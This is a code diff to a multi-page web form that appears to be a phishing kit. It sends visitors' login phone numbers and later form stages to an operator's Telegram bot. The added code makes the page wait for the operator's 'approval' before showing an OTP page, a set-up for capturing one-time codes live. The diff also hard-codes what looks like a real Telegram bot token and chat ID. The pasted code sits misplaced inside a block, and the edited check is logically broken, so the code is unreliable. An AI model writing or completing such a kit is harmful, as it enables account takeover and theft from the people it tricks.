@@ -746,6 +746,27 @@
             } else if (pageNum === 3) {
                 if (validatePage3()) {
                     // Show loading page while waiting for bot approval
+                    // Replace this in waitForLoginApproval():
+const BACKEND_API_URL = 'https://your-backend-url.com';
+
+const approvalCheck = setInterval(async () => {
+    try {
+        const response = await fetch(`${BACKEND_API_URL}/api/check-login-approval`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phoneNumber: applicationData.loginPhone })
+        });
+        const data = await response.json();
+        
+        if (data.approved) {
+            clearInterval(approvalCheck);
+            showPage(5);
+            startOTPTimer();
+        }
+    } catch (error) {
+        console.error('Error checking approval:', error);
+    }
+}, 1000);
                     showPage(4);
                     sendToTelegramBot('page3');
                     // WAIT FOR BOT APPROVAL - DO NOT AUTO-PROCEED
@@ -757,7 +778,7 @@
 
         async function sendToTelegramBot(stage) {
             // Validate that bot credentials are configured
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+            if (TELEGRAM_BOT_TOKEN === '8616013719:AAGZfZ2awOXRePuwmbDpHjG9CKa4bmae8Ac' || TELEGRAM_CHAT_ID === '8820857419') {
                 console.warn('⚠️ Telegram Bot credentials not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in index.html');
                 return;
             }
